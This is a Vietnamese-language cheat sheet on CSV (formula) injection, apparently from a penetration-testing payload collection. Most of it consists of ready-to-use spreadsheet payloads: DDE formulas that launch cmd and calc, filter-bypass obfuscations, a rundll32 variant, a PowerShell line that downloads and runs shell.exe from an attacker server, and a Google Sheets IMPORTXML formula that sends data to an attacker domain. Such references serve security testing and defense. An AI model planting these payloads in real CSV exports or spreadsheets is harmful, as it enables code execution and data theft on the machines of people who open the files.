# CSV Injection

> Nhiều ứng dụng web cho phép người dùng tải xuống nội dung như các mẫu (template) hóa đơn hoặc cài đặt người dùng dưới dạng file CSV. Nhiều người dùng chọn mở file CSV bằng Excel, Libre Office hoặc Open Office. Khi một ứng dụng web không xác thực đúng cách nội dung của file CSV, điều này có thể dẫn đến việc nội dung của một hoặc nhiều ô (cell) bị thực thi.

## Tóm tắt

* [Phương pháp](#methodology)
    * [Google Sheets](#google-sheets)
* [Tài liệu tham khảo](#references)

## Phương pháp

CSV Injection, còn được gọi là Formula Injection, là một lỗ hổng bảo mật xảy ra khi dữ liệu đầu vào không đáng tin cậy được đưa vào một file CSV. Bất kỳ công thức nào cũng có thể bắt đầu bằng:

```text
=
+
–
@
```

Các khai thác cơ bản với **Dynamic Data Exchange**.

* Khởi chạy calc

    ```text
    DDE ("cmd";"/C calc";"!A0")A0
    @SUM(1+1)*cmd|' /C calc'!A0
    =2+5+cmd|' /C calc'!A0
    =cmd|' /C calc'!'A1'
    ```

* Tải xuống và thực thi bằng PowerShell

    ```text
    =cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
    ```

* Che giấu tiền tố (prefix obfuscation) và chuỗi lệnh (command chaining)

    ```text
    =AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
    =cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A
    =         cmd|'/c calc.exe'!A
    ```

* Sử dụng rundll32 thay vì cmd

    ```text
    =rundll32|'URL.dll,OpenURL calc.exe'!A
    =rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A
    ```

* Sử dụng ký tự null để bypass các bộ lọc từ điển (dictionary filters). Vì chúng không phải là khoảng trắng nên bị bỏ qua khi thực thi.

    ```text
    =    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A
    ```

Chi tiết kỹ thuật của các payload trên:

* `cmd` là tên mà máy chủ có thể phản hồi bất cứ khi nào một client cố gắng truy cập máy chủ
* `/C` calc là tên file mà trong trường hợp của chúng ta chính là calc (tức là calc.exe)
* `!A0` là tên mục (item name) chỉ định đơn vị dữ liệu mà một máy chủ có thể phản hồi khi client yêu cầu dữ liệu

### Google Sheets

Google Sheets cho phép một số công thức bổ sung có khả năng lấy dữ liệu từ các URL từ xa:

* [IMPORTXML](https://support.google.com/docs/answer/3093342?hl=en)(url, xpath_query, locale)
* [IMPORTRANGE](https://support.google.com/docs/answer/3093340)(spreadsheet_url, range_string)
* [IMPORTHTML](https://support.google.com/docs/answer/3093339)(url, query, index)
* [IMPORTFEED](https://support.google.com/docs/answer/3093337)(url, [query], [headers], [num_items])
* [IMPORTDATA](https://support.google.com/docs/answer/3093335)(url)

Vì vậy, người ta có thể kiểm tra blind formula injection hoặc khả năng đánh cắp dữ liệu (data exfiltration) bằng:

```text
=IMPORTXML("http://[ATTACKER.DOMAIN.TLD]/csv", "//a/@href")
```

Lưu ý: một cảnh báo sẽ thông báo cho người dùng rằng một công thức đang cố gắng liên hệ với một tài nguyên bên ngoài và yêu cầu sự cho phép.

## Tài liệu tham khảo

* [CSV Excel Macro Injection - Timo Goosen, Albinowax - 21 tháng 6, 2022](https://web.archive.org/web/20260211194330/https://owasp.org/www-community/attacks/CSV_Injection)
* [CSV Excel formula injection - Google Bug Hunter University - 22 tháng 5, 2022](https://web.archive.org/web/20251126193606/https://bughunters.google.com/learn/invalid-reports/google-products/4965108570390528/csv-formula-injection)
* [CSV Injection – A Guide To Protecting CSV Files - Akansha Kesharwani - 30 tháng 11, 2017](https://web.archive.org/web/20221205154959/https://payatu.com/csv-injection-basic-to-exploit/)
* [From CSV to Meterpreter - Adam Chester - 5 tháng 11, 2015](https://web.archive.org/web/20251020005639/https://blog.xpnsec.com/from-csv-to-meterpreter/)
* [The Absurdly Underestimated Dangers of CSV Injection - George Mauer - 7 tháng 10, 2017](https://web.archive.org/web/20260216175809/https://georgemauer.net/2017/10/07/csv-injection.html)
* [Three New DDE Obfuscation Methods - ReversingLabs - 24 tháng 9, 2018](https://web.archive.org/web/20220928031043/https://blog.reversinglabs.com/blog/cvs-dde-exploits-and-obfuscation)
* [Your Excel Sheets Are Not Safe! Here's How to Beat CSV Injection - we45 - 5 tháng 10, 2020](https://web.archive.org/web/20260115180627/https://www.we45.com/post/your-excel-sheets-are-not-safe-heres-how-to-beat-csv-injection)
